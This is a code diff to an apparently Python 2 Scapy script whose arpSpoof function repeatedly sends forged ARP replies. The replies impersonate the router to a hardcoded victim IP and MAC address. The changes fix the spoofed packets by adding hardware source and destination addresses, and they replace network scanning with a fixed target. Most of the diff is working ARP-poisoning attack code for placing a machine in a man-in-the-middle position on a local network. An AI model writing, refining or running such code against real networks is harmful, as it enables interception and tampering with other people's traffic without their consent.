@@ -18,7 +18,7 @@ from user import *
 
 
 # global variables:
-localAddresses=[]
+localAddresses=['10.30.58.219']
 addressesLock=Lock()
 gatewayMAC=''
 bad_packet=[]
@@ -141,6 +141,7 @@ def arpSpoof(router):
     every 30 seconds send ARP broadcast to spoof all machines on LAN
     """
     while True:
+
         if len(localAddresses)>0:
             addressesLock.acquire()
             #print 'spoofing',str(len(localAddresses)), localAddresses
@@ -148,15 +149,17 @@ def arpSpoof(router):
                 #if host != localHost:
                 if host=='10.30.58.219':
                     print 'spoofing',host
-                    victimPacket = Ether(dst='70:5a:0f:47:d3:af')/ARP(op=2,psrc = router, pdst=host)#create arp packets
+                    victimPacket = Ether(dst='70:5a:0f:47:d3:af')/ARP(op=2,psrc = router, pdst=host,hwdst='70:5a:0f:47:d3:af',hwsrc='08:00:27:f9:94:1b')#create arp packets
+                    #packet needs to have MAC addresses
                     #gatewayPacket=Ether()/ARP(op=2,psrc=host,pdst=router)
                     logging.debug('spoofing: '+victimPacket[ARP].pdst)
                     sendp(victimPacket,verbose=0)#send packets
                     #sendp(gatewayPacket,verbose=0)
 
             addressesLock.release()
-            print 'done spoofing'
+            #print 'done spoofing'
             #sleep(3)
+
 
 
 
@@ -176,7 +179,8 @@ def setup():
     logging.debug('got default gateway and local IP and MAC')
 
     global localAddresses
-    localAddresses=functions.get_Local_Addresses(defaultGateway,localHost) #get addresses of all hosts on network
+    #TODO: retrieve MAC addresses as well as IP addresses
+    #localAddresses=functions.get_Local_Addresses(defaultGateway,localHost) #get addresses of all hosts on network
     logging.debug('scanned network for all active hosts')
     print localAddresses
 
